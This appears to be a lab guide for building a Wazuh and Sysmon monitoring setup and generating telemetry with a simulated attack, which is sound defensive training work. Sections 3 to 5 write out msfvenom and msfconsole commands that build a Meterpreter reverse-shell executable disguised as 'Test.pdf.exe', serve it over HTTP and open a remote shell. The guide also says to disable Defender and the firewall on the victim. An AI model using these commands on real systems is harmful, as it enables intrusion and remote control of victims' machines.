# Setup and Controlled Simulation

This documents the lab build and a controlled, isolated test used to generate Windows and Wazuh telemetry. It must be run only in a private lab owned by the tester or where explicit authorization has been granted.

## 1. Wazuh Server Installation — Ubuntu 24.04

The operating system is updated and the all-in-one Wazuh deployment is installed:

```bash
sudo apt update && sudo apt upgrade -y
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

The tester signs in to the dashboard as **admin** using the password generated by the installer.

The components are verified:

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
sudo systemctl status filebeat
```

## 2. Windows 10 Victim Setup

### 2.1. Install Sysmon

1. Download [Sysmon](https://learn.microsoft.com/sysinternals/downloads/sysmon).
2. Download the [SwiftOnSecurity Sysmon baseline configuration](https://github.com/SwiftOnSecurity/sysmon-config).
3. In an elevated PowerShell or Command Prompt, the following command is run:
   
```powershell
.\Sysmon64.exe -accepteula -i .\sysmonconfig-export.xml
```

4. The service status is verified:

```powershell
Get-Service Sysmon64
```

5. In Event Viewer, Applications and Services Logs → Microsoft → Windows → Sysmon → Operational is opened. Normal activity should generate Event ID 1 process-creation entries.
   
### 2.2. Install the Wazuh Agent

In the Wazuh dashboard:

1. Go to **Agents → Deploy new agent**.
2. Select **Windows**.
3. Enter manager IP `192.168.100.20` and agent name `windows10-victim`.
4. Copy and run the dashboard-generated installation command. It is preferred because it matches the installed Wazuh release and includes the manager address.

The agent is started and verified:

```powershell
Start-Service WazuhSvc
Get-Service WazuhSvc
```

### 2.3. Forward Sysmon Events to Wazuh

C:\Program Files (x86)\ossec-agent\ossec.conf is opened as Administrator. In Notepad, File → Open is selected, the file type is changed to All Files, and the configuration file is opened.

The following is added before the final </ossec_config> tag:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

The configuration is saved and the agent is restarted:

```powershell
Restart-Service WazuhSvc
```
### 2.4 Lab-only endpoint changes

If a test artifact must run long enough to produce telemetry, Windows Defender and the firewall may block it. These controls should be changed or disabled only on the isolated victim VM and restored immediately after testing.

## 3. Kali Attacker Setup

### 3.1 Confirm the target is reachable

```bash
ip a
nmap -A 192.168.100.30 -Pn
```
### 3.2 Build the test artifact and listener

This section is used only for an authorized, isolated demonstration. The output must remain confined to the lab and must not be distributed.

```bash
msfvenom -l payloads | grep -i meterpreter | grep -i windows

msfvenom -p windows/x64/meterpreter_reverse_tcp \
  lhost=192.168.100.10 lport=4444 -f exe -o Test.pdf.exe
```

The matching handler is started in another Kali terminal:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost 192.168.100.10
set lport 4444
options
exploit
```
### 3.3 Serve the test artifact to the victim

From the directory containing `Test.pdf.exe`:

```bash
python3 -m http.server 9999
```

This terminal remains running while the victim downloads the file. The test URL is http://192.168.100.10:9999/.

## 4. Controlled Delivery and Execution — Windows Victim

Before execution, the Wazuh agent should be Active, Sysmon Event ID 1 should be generated locally, Wazuh should receive a recent test event, and the dashboard time range should include the current time.

A private/incognito browser window is opened to http://192.168.100.10:9999/.
Test.pdf.exe is downloaded.
**View → File** name extensions is enabled so the .exe extension is visible.
The test artifact is executed in the isolated victim VM.
In an elevated Command Prompt, active connections are inspected:
```cmd
netstat -anob
```

## 5. Confirm the Callback — Kali

The handler output before and after execution is compared. A new session should appear:

```text
sessions -l
shell
```
## 6. Clean-up

After the demonstration, the HTTP server and handler are stopped, the test artifact is removed from the victim VM, and Defender and firewall protection are restored. A clean VM snapshot should be taken before the next run to support repeatable results.
